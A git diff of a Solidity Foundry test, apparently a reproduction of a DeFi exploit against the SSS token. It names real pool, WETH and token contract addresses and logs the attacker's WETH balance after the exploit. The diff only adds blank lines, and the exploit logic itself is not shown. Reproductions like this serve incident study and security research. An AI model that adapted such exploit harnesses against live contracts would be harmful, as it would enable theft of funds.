@@ -14,11 +14,14 @@ import "./../interface.sol";
 // https://twitter.com/dot_pengun/status/1770989208125272481
 
 interface ISSS is IERC20 {
+
     function maxAmountPerTx() external view returns (uint256);
     function burn(uint256) external;
+
 }
 
 contract SSSExploit is Test {
+
     address private constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
     IWETH private constant WETH = IWETH(payable(0x4300000000000000000000000000000000000004));
     ISSS private constant SSS = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
@@ -89,4 +92,5 @@ contract SSSExploit is Test {
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
         );
     }
+
 }
